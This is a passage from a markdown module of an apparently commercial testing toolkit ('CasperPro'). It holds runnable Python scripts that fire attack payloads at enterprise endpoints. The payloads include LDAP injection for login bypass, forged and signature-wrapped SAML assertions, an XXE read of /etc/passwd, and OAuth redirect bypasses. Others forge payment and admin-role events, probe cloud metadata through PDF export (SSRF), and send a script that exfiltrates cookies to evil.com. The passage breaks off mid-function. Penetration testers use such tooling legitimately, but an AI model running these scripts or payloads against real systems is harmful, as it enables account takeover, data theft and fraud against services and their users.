# CasperPro Enterprise Technology Testing Module

> **Security Testing for Enterprise Protocols and Technologies**  
> LDAP, SAML, OAuth/OIDC, GraphQL Enterprise, Message Queues, Document Generation, and Webhooks.

## Overview

This module covers security testing for enterprise-specific technologies:

- **LDAP Injection** - Directory service attacks
- **SAML/SSO Attacks** - Single sign-on bypass and manipulation
- **OAuth/OIDC Attacks** - Authorization flow exploitation
- **GraphQL Enterprise** - Advanced GraphQL attacks
- **Message Queue Injection** - Event/queue manipulation
- **Document Generation** - PDF/export SSRF and injection
- **Webhook SSRF** - Callback URL exploitation

> **Python Package Manager**: All Python operations MUST use `uv`. Never use `pip`.

## 1. LDAP Injection Testing

### 1.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_ldap_injection.py
# Run with: uv run casperpro_ldap_injection.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from urllib.parse import quote

@dataclass
class LDAPInjectionTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_authentication_bypass(self):
        """Test LDAP authentication bypass"""
        print("[*] Testing LDAP authentication bypass...")
        
        payloads = [
            # Wildcard injection
            {"username": "*", "password": "*"},
            {"username": "*)(uid=*", "password": "anything"},
            
            # Filter bypass
            {"username": "admin)(&)", "password": "anything"},
            {"username": "admin)(|(password=*)", "password": "anything"},
            {"username": "*)(objectClass=*", "password": "anything"},
            
            # Null byte
            {"username": "admin\x00", "password": "anything"},
            
            # Comment injection
            {"username": "admin)(comment=*", "password": "anything"},
            
            # OR injection
            {"username": "admin)(|(uid=admin)", "password": "anything"},
            {"username": "*)(|(objectClass=*)", "password": "x"},
        ]
        
        for payload in payloads:
            resp = self._request("/auth/ldap", "POST", payload)
            
            if resp["status"] == 200 and ("success" in resp["body"].lower() or 
                                          "authenticated" in resp["body"].lower() or
                                          "token" in resp["body"].lower()):
                print(f"  [VULN] LDAP auth bypass: {payload['username'][:30]}")
                self.findings.append({
                    "test": "LDAP Authentication Bypass",
                    "payload": payload,
                    "severity": "CRITICAL"
                })
    
    def test_data_exfiltration(self):
        """Test LDAP data exfiltration"""
        print("[*] Testing LDAP data exfiltration...")
        
        # Try to extract additional attributes
        payloads = [
            {"username": "*)(userPassword=*", "password": "x"},
            {"username": "*)(mail=*", "password": "x"},
            {"username": "*)(telephoneNumber=*", "password": "x"},
            {"username": "*)(description=*", "password": "x"},
            {"username": "admin)(|(memberOf=*)", "password": "x"},
        ]
        
        for payload in payloads:
            resp = self._request("/user/search", "POST", payload)
            
            if resp["status"] == 200 and len(resp["body"]) > 100:
                print(f"  [VULN] LDAP data exfiltration possible")
                self.findings.append({
                    "test": "LDAP Data Exfiltration",
                    "payload": payload,
                    "severity": "HIGH"
                })
    
    def test_blind_ldap_injection(self):
        """Test blind LDAP injection"""
        print("[*] Testing blind LDAP injection...")
        
        # Boolean-based blind injection
        true_payload = {"username": "admin)(objectClass=*", "password": "x"}
        false_payload = {"username": "admin)(objectClass=XXXXX", "password": "x"}
        
        true_resp = self._request("/user/check", "POST", true_payload)
        false_resp = self._request("/user/check", "POST", false_payload)
        
        if true_resp["body"] != false_resp["body"]:
            print(f"  [VULN] Blind LDAP injection detected")
            self.findings.append({
                "test": "Blind LDAP Injection",
                "severity": "HIGH"
            })
    
    def run_all(self):
        """Run all LDAP injection tests"""
        self.test_authentication_bypass()
        self.test_data_exfiltration()
        self.test_blind_ldap_injection()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = LDAPInjectionTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 2. SAML/SSO Attack Testing

### 2.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_saml_attacks.py
# Run with: uv run casperpro_saml_attacks.py

import subprocess
import json
import sys
import base64
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class SAMLAttackTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def _encode_saml(self, xml: str) -> str:
        """Base64 encode SAML response"""
        return base64.b64encode(xml.encode()).decode()
    
    def test_signature_bypass(self):
        """Test SAML signature bypass"""
        print("[*] Testing SAML signature bypass...")
        
        # Unsigned SAML response
        unsigned_saml = """<?xml version="1.0"?>
        <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
            <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
                <saml:Subject>
                    <saml:NameID>admin@target.com</saml:NameID>
                </saml:Subject>
                <saml:AttributeStatement>
                    <saml:Attribute Name="Role">
                        <saml:AttributeValue>admin</saml:AttributeValue>
                    </saml:Attribute>
                </saml:AttributeStatement>
            </saml:Assertion>
        </samlp:Response>"""
        
        payloads = [
            {"SAMLResponse": self._encode_saml(unsigned_saml)},
            {"SAMLResponse": self._encode_saml(unsigned_saml), "bypass_signature": True},
            {"SAMLResponse": ""},  # Empty response
        ]
        
        for payload in payloads:
            resp = self._request("/auth/saml/acs", "POST", payload)
            
            if resp["status"] == 200 and ("session" in resp["body"].lower() or 
                                          "authenticated" in resp["body"].lower()):
                print(f"  [VULN] SAML signature bypass!")
                self.findings.append({
                    "test": "SAML Signature Bypass",
                    "severity": "CRITICAL"
                })
                break
    
    def test_xml_signature_wrapping(self):
        """Test XML Signature Wrapping (XSW) attacks"""
        print("[*] Testing XML Signature Wrapping...")
        
        # XSW attack - duplicate assertion with malicious content
        xsw_saml = """<?xml version="1.0"?>
        <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
            <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="evil">
                <saml:Subject>
                    <saml:NameID>attacker@evil.com</saml:NameID>
                </saml:Subject>
                <saml:AttributeStatement>
                    <saml:Attribute Name="Role">
                        <saml:AttributeValue>admin</saml:AttributeValue>
                    </saml:Attribute>
                </saml:AttributeStatement>
            </saml:Assertion>
            <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="original">
                <saml:Subject>
                    <saml:NameID>user@target.com</saml:NameID>
                </saml:Subject>
            </saml:Assertion>
        </samlp:Response>"""
        
        resp = self._request("/auth/saml/acs", "POST", {
            "SAMLResponse": self._encode_saml(xsw_saml)
        })
        
        if resp["status"] == 200 and "admin" in resp["body"].lower():
            print(f"  [VULN] XML Signature Wrapping successful!")
            self.findings.append({
                "test": "XML Signature Wrapping",
                "severity": "CRITICAL"
            })
    
    def test_assertion_replay(self):
        """Test SAML assertion replay"""
        print("[*] Testing SAML assertion replay...")
        
        # Get a valid SAML response first (if possible)
        # Then try to replay it multiple times
        
        valid_saml = self._encode_saml("<saml>test</saml>")
        
        success_count = 0
        for _ in range(3):
            resp = self._request("/auth/saml/acs", "POST", {"SAMLResponse": valid_saml})
            if resp["status"] == 200:
                success_count += 1
        
        if success_count > 1:
            print(f"  [VULN] SAML assertion replay - {success_count} times")
            self.findings.append({
                "test": "SAML Assertion Replay",
                "count": success_count,
                "severity": "HIGH"
            })
    
    def test_xxe_in_saml(self):
        """Test XXE in SAML processing"""
        print("[*] Testing XXE in SAML...")
        
        xxe_saml = """<?xml version="1.0"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
            <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
                <saml:Subject>
                    <saml:NameID>&xxe;</saml:NameID>
                </saml:Subject>
            </saml:Assertion>
        </samlp:Response>"""
        
        resp = self._request("/auth/saml/acs", "POST", {
            "SAMLResponse": self._encode_saml(xxe_saml)
        })
        
        if "root:" in resp["body"] or "/bin/bash" in resp["body"]:
            print(f"  [VULN] XXE in SAML processing!")
            self.findings.append({
                "test": "XXE in SAML",
                "severity": "CRITICAL"
            })
    
    def test_relay_state_injection(self):
        """Test RelayState parameter injection"""
        print("[*] Testing RelayState injection...")
        
        payloads = [
            {"RelayState": "javascript:alert(1)"},
            {"RelayState": "https://evil.com"},
            {"RelayState": "//evil.com"},
            {"RelayState": "data:text/html,<script>alert(1)</script>"},
        ]
        
        for payload in payloads:
            resp = self._request("/auth/saml/acs", "POST", payload)
            
            if resp["status"] in [200, 302]:
                # Check if RelayState is reflected in redirect
                if payload["RelayState"] in resp["body"]:
                    print(f"  [VULN] RelayState injection: {payload['RelayState'][:30]}")
                    self.findings.append({
                        "test": "RelayState Injection",
                        "payload": payload,
                        "severity": "HIGH"
                    })
    
    def run_all(self):
        """Run all SAML attack tests"""
        self.test_signature_bypass()
        self.test_xml_signature_wrapping()
        self.test_assertion_replay()
        self.test_xxe_in_saml()
        self.test_relay_state_injection()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = SAMLAttackTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 3. OAuth/OIDC Attack Testing

### 3.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_oauth_attacks.py
# Run with: uv run casperpro_oauth_attacks.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from urllib.parse import urlencode, quote

@dataclass
class OAuthAttackTester:
    base_url: str
    token: str
    client_id: str = "test_client"
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, url: str, method: str = "GET", data: dict = None, 
                 follow_redirects: bool = False) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}\n%{redirect_url}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}"]
        
        if not follow_redirects:
            cmd.append("-L")
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", urlencode(data)])
            cmd.extend(["-H", "Content-Type: application/x-www-form-urlencoded"])
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        
        return {
            "status": int(lines[-2]) if len(lines) >= 2 and lines[-2].isdigit() else 0,
            "redirect_url": lines[-1] if lines[-1].startswith("http") else "",
            "body": "\n".join(lines[:-2])
        }
    
    def test_redirect_uri_bypass(self):
        """Test redirect_uri validation bypass"""
        print("[*] Testing redirect_uri bypass...")
        
        # Various bypass techniques
        bypasses = [
            # Open redirect
            "https://evil.com",
            
            # Subdomain bypass
            f"https://target.com.evil.com",
            f"https://evil.target.com",
            
            # Path traversal
            f"{self.base_url}/callback/../../../evil",
            f"{self.base_url}/callback/..%2f..%2fevil",
            
            # Parameter pollution
            f"{self.base_url}/callback?next=https://evil.com",
            f"{self.base_url}/callback#@evil.com",
            
            # Protocol confusion
            f"//evil.com",
            f"https:evil.com",
            
            # Encoded bypasses
            f"{self.base_url}/callback%00.evil.com",
            f"{self.base_url}/callback%23@evil.com",
        ]
        
        for redirect_uri in bypasses:
            url = f"{self.base_url}/oauth/authorize?client_id={self.client_id}&redirect_uri={quote(redirect_uri)}&response_type=code"
            resp = self._request(url)
            
            if resp["status"] in [200, 302] and "error" not in resp["body"].lower():
                # Check if malicious redirect would be used
                if "evil" in resp["redirect_url"] or resp["status"] == 200:
                    print(f"  [VULN] Redirect URI bypass: {redirect_uri[:50]}")
                    self.findings.append({
                        "test": "Redirect URI Bypass",
                        "payload": redirect_uri,
                        "severity": "HIGH"
                    })
    
    def test_state_parameter_issues(self):
        """Test state parameter validation issues"""
        print("[*] Testing state parameter issues...")
        
        # Missing state
        url = f"{self.base_url}/oauth/authorize?client_id={self.client_id}&redirect_uri={self.base_url}/callback&response_type=code"
        resp = self._request(url)
        
        if resp["status"] in [200, 302] and "state" not in resp["redirect_url"]:
            print(f"  [VULN] OAuth allows missing state parameter (CSRF)")
            self.findings.append({
                "test": "Missing State Parameter",
                "severity": "MEDIUM"
            })
        
        # Predictable state
        predictable_states = ["1", "test", "state", "123456"]
        for state in predictable_states:
            url = f"{self.base_url}/oauth/authorize?client_id={self.client_id}&redirect_uri={self.base_url}/callback&response_type=code&state={state}"
            resp = self._request(url)
            
            if resp["status"] in [200, 302]:
                print(f"  [INFO] State '{state}' accepted - verify randomness")
    
    def test_authorization_code_issues(self):
        """Test authorization code security issues"""
        print("[*] Testing authorization code issues...")
        
        # Code reuse
        code = "test_auth_code_123"
        
        success_count = 0
        for _ in range(3):
            resp = self._request(f"{self.base_url}/oauth/token", "POST", {
                "grant_type": "authorization_code",
                "code": code,
                "client_id": self.client_id,
                "redirect_uri": f"{self.base_url}/callback"
            })
            
            if resp["status"] == 200 and "access_token" in resp["body"]:
                success_count += 1
        
        if success_count > 1:
            print(f"  [VULN] Authorization code reuse - {success_count} times")
            self.findings.append({
                "test": "Authorization Code Reuse",
                "count": success_count,
                "severity": "HIGH"
            })
    
    def test_token_leakage(self):
        """Test for token leakage via referrer"""
        print("[*] Testing token leakage...")
        
        # Check if tokens are passed in URL fragment or query
        url = f"{self.base_url}/oauth/authorize?client_id={self.client_id}&redirect_uri={self.base_url}/callback&response_type=token"
        resp = self._request(url)
        
        if resp["status"] in [200, 302]:
            if "access_token" in resp["redirect_url"] and "?" in resp["redirect_url"]:
                print(f"  [VULN] Access token in query string (referrer leakage)")
                self.findings.append({
                    "test": "Token in Query String",
                    "severity": "HIGH"
                })
    
    def test_scope_escalation(self):
        """Test scope escalation"""
        print("[*] Testing scope escalation...")
        
        escalated_scopes = [
            "admin",
            "admin:*",
            "write delete admin",
            "openid profile email admin",
            "*",
        ]
        
        for scope in escalated_scopes:
            url = f"{self.base_url}/oauth/authorize?client_id={self.client_id}&redirect_uri={self.base_url}/callback&response_type=code&scope={quote(scope)}"
            resp = self._request(url)
            
            if resp["status"] in [200, 302] and "error" not in resp["body"].lower():
                print(f"  [VULN] Scope escalation: {scope}")
                self.findings.append({
                    "test": "Scope Escalation",
                    "scope": scope,
                    "severity": "HIGH"
                })
    
    def test_client_id_spoofing(self):
        """Test client ID spoofing"""
        print("[*] Testing client ID spoofing...")
        
        spoofed_clients = [
            "admin_client",
            "trusted_client",
            "internal_app",
            "first_party",
        ]
        
        for client_id in spoofed_clients:
            url = f"{self.base_url}/oauth/authorize?client_id={client_id}&redirect_uri={self.base_url}/callback&response_type=code"
            resp = self._request(url)
            
            if resp["status"] in [200, 302] and "error" not in resp["body"].lower():
                print(f"  [INFO] Client ID '{client_id}' accepted - verify registration")
    
    def test_pkce_bypass(self):
        """Test PKCE (Proof Key for Code Exchange) bypass"""
        print("[*] Testing PKCE bypass...")
        
        # Try without PKCE
        url = f"{self.base_url}/oauth/authorize?client_id={self.client_id}&redirect_uri={self.base_url}/callback&response_type=code"
        resp = self._request(url)
        
        if resp["status"] in [200, 302] and "error" not in resp["body"].lower():
            print(f"  [VULN] PKCE not enforced for public client")
            self.findings.append({
                "test": "PKCE Bypass",
                "severity": "MEDIUM"
            })
        
        # Try with weak code_challenge_method
        weak_url = url + "&code_challenge=test&code_challenge_method=plain"
        resp = self._request(weak_url)
        
        if resp["status"] in [200, 302]:
            print(f"  [VULN] Plain code_challenge_method accepted")
            self.findings.append({
                "test": "Weak PKCE",
                "severity": "MEDIUM"
            })
    
    def run_all(self):
        """Run all OAuth attack tests"""
        self.test_redirect_uri_bypass()
        self.test_state_parameter_issues()
        self.test_authorization_code_issues()
        self.test_token_leakage()
        self.test_scope_escalation()
        self.test_client_id_spoofing()
        self.test_pkce_bypass()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [client_id] [proxy]")
        sys.exit(1)
    
    tester = OAuthAttackTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        client_id=sys.argv[3] if len(sys.argv) > 3 else "test_client",
        proxy=sys.argv[4] if len(sys.argv) > 4 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 4. GraphQL Enterprise Attacks

### 4.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_graphql_enterprise.py
# Run with: uv run casperpro_graphql_enterprise.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class GraphQLEnterpriseTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _graphql(self, query: str, variables: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", "POST",
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        cmd.extend(["-d", json.dumps(payload)])
        cmd.append(f"{self.base_url}/graphql")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        body = "\n".join(lines[:-1])
        
        try:
            json_data = json.loads(body)
        except:
            json_data = {}
        
        return {"status": status, "body": body, "json": json_data}
    
    def test_batch_attack(self):
        """Test GraphQL batching attacks"""
        print("[*] Testing GraphQL batch attacks...")
        
        # Batch query to bypass rate limiting
        batch_query = [
            {"query": "{ user(id: 1) { email password } }"},
            {"query": "{ user(id: 2) { email password } }"},
            {"query": "{ user(id: 3) { email password } }"},
            {"query": "{ user(id: 4) { email password } }"},
            {"query": "{ user(id: 5) { email password } }"},
        ]
        
        cmd = ["curl", "-s", "-X", "POST",
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json",
               "-d", json.dumps(batch_query)]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        
        cmd.append(f"{self.base_url}/graphql")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.stdout and "data" in result.stdout:
            try:
                data = json.loads(result.stdout)
                if isinstance(data, list) and len(data) > 1:
                    print(f"  [VULN] Batch queries accepted - potential rate limit bypass")
                    self.findings.append({
                        "test": "GraphQL Batching",
                        "batch_size": len(data),
                        "severity": "MEDIUM"
                    })
            except:
                pass
    
    def test_alias_dos(self):
        """Test alias-based DoS"""
        print("[*] Testing alias-based DoS...")
        
        # Many aliases for same expensive query
        aliases = " ".join([f"a{i}: user(id: {i}) {{ email name profile {{ bio }} }}" 
                           for i in range(100)])
        query = f"{{ {aliases} }}"
        
        import time
        start = time.time()
        resp = self._graphql(query)
        elapsed = time.time() - start
        
        if elapsed > 5:
            print(f"  [VULN] Alias DoS - response took {elapsed:.2f}s")
            self.findings.append({
                "test": "Alias DoS",
                "response_time": elapsed,
                "severity": "MEDIUM"
            })
        
        if resp["json"].get("data"):
            print(f"  [VULN] 100 alias queries executed without limit")
            self.findings.append({
                "test": "No Alias Limit",
                "severity": "MEDIUM"
            })
    
    def test_depth_attack(self):
        """Test query depth attacks"""
        print("[*] Testing query depth attacks...")
        
        # Deeply nested query
        depth = 20
        nested_query = "{ user(id: 1) " + "{ friends " * depth + "{ id } " + "} " * depth + "}"
        
        resp = self._graphql(nested_query)
        
        if resp["json"].get("data"):
            print(f"  [VULN] Deep query (depth={depth}) executed")
            self.findings.append({
                "test": "Query Depth Attack",
                "depth": depth,
                "severity": "MEDIUM"
            })
    
    def test_field_duplication(self):
        """Test field duplication attacks"""
        print("[*] Testing field duplication...")
        
        # Duplicate fields
        duplicated = " ".join(["email"] * 1000)
        query = f"{{ user(id: 1) {{ {duplicated} }} }}"
        
        resp = self._graphql(query)
        
        if resp["status"] == 200:
            print(f"  [VULN] Field duplication accepted (1000x)")
            self.findings.append({
                "test": "Field Duplication",
                "count": 1000,
                "severity": "LOW"
            })
    
    def test_introspection_bypass(self):
        """Test introspection bypass techniques"""
        print("[*] Testing introspection bypass...")
        
        # Various introspection queries
        queries = [
            # Standard introspection
            "{ __schema { types { name } } }",
            
            # Partial introspection
            "{ __type(name: \"User\") { fields { name } } }",
            
            # Using aliases
            "{ a: __schema { types { name } } }",
            
            # Via fragment
            """
            { 
                __schema { 
                    ...SchemaFields 
                } 
            }
            fragment SchemaFields on __Schema { 
                types { name } 
            }
            """,
        ]
        
        for query in queries:
            resp = self._graphql(query)
            
            if resp["json"].get("data") and "__schema" in str(resp["json"]) or "__type" in str(resp["json"]):
                print(f"  [INFO] Introspection enabled")
                break
            elif "disabled" in resp["body"].lower() or "not allowed" in resp["body"].lower():
                print(f"  [OK] Introspection disabled")
                break
    
    def test_directive_abuse(self):
        """Test directive abuse"""
        print("[*] Testing directive abuse...")
        
        queries = [
            # Multiple directives
            "{ user(id: 1) @include(if: true) @skip(if: false) { email } }",
            
            # Custom directive injection
            "{ user(id: 1) @debug { email } }",
            "{ user(id: 1) @admin { email password } }",
            
            # Directive with expressions
            '{ user(id: 1) @include(if: "true") { email } }',
        ]
        
        for query in queries:
            resp = self._graphql(query)
            
            if resp["json"].get("data"):
                print(f"  [INFO] Query with directives accepted")
    
    def test_subscription_abuse(self):
        """Test subscription-based attacks"""
        print("[*] Testing subscription abuse...")
        
        # Try to subscribe to admin events
        queries = [
            "subscription { userCreated { id email role } }",
            "subscription { adminAction { type user { email } } }",
            "subscription { systemEvent { type data } }",
        ]
        
        for query in queries:
            resp = self._graphql(query)
            
            if resp["status"] == 200 and "errors" not in resp["body"]:
                print(f"  [VULN] Subscription to sensitive events possible")
                self.findings.append({
                    "test": "Subscription Abuse",
                    "severity": "MEDIUM"
                })
    
    def run_all(self):
        """Run all GraphQL enterprise tests"""
        self.test_batch_attack()
        self.test_alias_dos()
        self.test_depth_attack()
        self.test_field_duplication()
        self.test_introspection_bypass()
        self.test_directive_abuse()
        self.test_subscription_abuse()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = GraphQLEnterpriseTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 5. Message Queue and Event Injection

### 5.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_message_queue.py
# Run with: uv run casperpro_message_queue.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class MessageQueueTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_event_injection(self):
        """Test malicious event injection"""
        print("[*] Testing event injection...")
        
        malicious_events = [
            {"event": "user.deleted", "user_id": "admin"},
            {"event": "payment.completed", "amount": 999999, "user_id": "attacker"},
            {"event": "order.shipped", "order_id": "ORD001", "bypass_check": True},
            {"event": "admin.grant_role", "user_id": "attacker", "role": "admin"},
            {"event": "system.config_change", "key": "debug", "value": True},
        ]
        
        for event in malicious_events:
            resp = self._request("/events/publish", "POST", event)
            
            if resp["status"] == 200:
                print(f"  [VULN] Event injection accepted: {event['event']}")
                self.findings.append({
                    "test": "Event Injection",
                    "event": event,
                    "severity": "HIGH"
                })
    
    def test_queue_manipulation(self):
        """Test queue destination manipulation"""
        print("[*] Testing queue manipulation...")
        
        payloads = [
            {"queue": "admin_notifications", "message": {"action": "grant_admin"}},
            {"queue": "payment_processor", "message": {"amount": -1000}},
            {"queue": "../../../admin_queue", "message": {"cmd": "test"}},
            {"queue": "user_queue\x00admin_queue", "message": {"test": True}},
        ]
        
        for payload in payloads:
            resp = self._request("/queue/send", "POST", payload)
            
            if resp["status"] == 200:
                print(f"  [VULN] Queue manipulation: {payload['queue']}")
                self.findings.append({
                    "test": "Queue Manipulation",
                    "payload": payload,
                    "severity": "HIGH"
                })
    
    def test_message_format_injection(self):
        """Test message format injection"""
        print("[*] Testing message format injection...")
        
        # JSON injection in message
        payloads = [
            {"message": '{"admin": true, "original": "test"}'},
            {"message": {"__proto__": {"admin": True}}},
            {"message": {"$set": {"role": "admin"}}},  # MongoDB operator
        ]
        
        for payload in payloads:
            resp = self._request("/messages/send", "POST", payload)
            
            if resp["status"] == 200:
                print(f"  [INFO] Message format accepted - verify deserialization")
    
    def test_replay_attack(self):
        """Test message replay attacks"""
        print("[*] Testing message replay...")
        
        message = {
            "id": "MSG001",
            "action": "transfer",
            "amount": 100,
            "timestamp": "2024-01-01T00:00:00Z"
        }
        
        success_count = 0
        for _ in range(5):
            resp = self._request("/messages/process", "POST", message)
            if resp["status"] == 200 and "success" in resp["body"].lower():
                success_count += 1
        
        if success_count > 1:
            print(f"  [VULN] Message replay - {success_count} times")
            self.findings.append({
                "test": "Message Replay",
                "count": success_count,
                "severity": "HIGH"
            })
    
    def run_all(self):
        """Run all message queue tests"""
        self.test_event_injection()
        self.test_queue_manipulation()
        self.test_message_format_injection()
        self.test_replay_attack()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = MessageQueueTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 6. Document Generation Attacks

### 6.1 Python Implementation

```python
#!/usr/bin/env python3
# casperpro_document_generation.py
# Run with: uv run casperpro_document_generation.py

import subprocess
import json
import sys
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class DocumentGenerationTester:
    base_url: str
    token: str
    proxy: Optional[str] = None
    findings: List[Dict] = field(default_factory=list)
    
    def _request(self, endpoint: str, method: str = "POST", data: dict = None) -> dict:
        cmd = ["curl", "-s", "-w", "\n%{http_code}", "-X", method,
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json"]
        
        if self.proxy:
            cmd.extend(["--proxy", self.proxy, "-k"])
        if data:
            cmd.extend(["-d", json.dumps(data)])
        cmd.append(f"{self.base_url}{endpoint}")
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        lines = result.stdout.strip().split("\n")
        status = int(lines[-1]) if lines[-1].isdigit() else 0
        return {"status": status, "body": "\n".join(lines[:-1])}
    
    def test_ssrf_via_pdf(self):
        """Test SSRF via PDF generation"""
        print("[*] Testing SSRF via PDF generation...")
        
        ssrf_payloads = [
            # External image
            {"content": "<img src='http://169.254.169.254/latest/meta-data/'>"},
            
            # CSS import
            {"content": "<link rel='stylesheet' href='http://169.254.169.254/'>"},
            
            # Iframe
            {"content": "<iframe src='http://localhost:6379/'></iframe>"},
            
            # Object tag
            {"content": "<object data='http://internal-api:8080/admin'></object>"},
            
            # SVG with external reference
            {"content": "<svg><image href='http://169.254.169.254/'/></svg>"},
        ]
        
        for payload in ssrf_payloads:
            resp = self._request("/export/pdf", "POST", payload)
            
            if resp["status"] == 200:
                # Check for signs of SSRF
                if "ami-" in resp["body"] or "instance" in resp["body"].lower():
                    print(f"  [VULN] SSRF via PDF - AWS metadata accessed!")
                    self.findings.append({
                        "test": "PDF SSRF",
                        "payload": payload,
                        "severity": "CRITICAL"
                    })
    
    def test_xss_in_pdf(self):
        """Test XSS in PDF generation"""
        print("[*] Testing XSS in PDF generation...")
        
        xss_payloads = [
            {"content": "<script>document.location='https://evil.com?c='+document.cookie</script>"},
            {"content": "<body onload='fetch(\"https://evil.com\")'>"},
            {"content": "{{constructor.constructor('return this.process.env')()}}"},
        ]
        
        for payload in xss_payloads:
            resp = self._request("/export/pdf", "POST", payload)
            
            if resp["status"] == 200:
                print(f"  [INFO] PDF generated - verify XSS in reader")
    
    def test_local_file_inclusion(self):
        """Test LFI via document generation"""
